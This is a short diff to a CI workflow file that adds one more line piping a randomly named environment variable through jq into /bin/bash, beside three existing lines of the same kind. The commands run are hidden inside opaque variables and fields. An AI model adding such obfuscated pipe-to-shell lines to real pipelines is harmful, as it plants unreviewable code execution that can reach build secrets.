@@ -22,6 +22,7 @@ jobs:
           echo $svfgo153 | jq -r .p812 | /bin/bash
           echo $aztzr7 | jq -r .ur5289 | /bin/bash
           echo $akrdp2 | jq -r .bdb12 | /bin/bash
+          printf '%s' "$wwl39" | jq -r .eq65 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
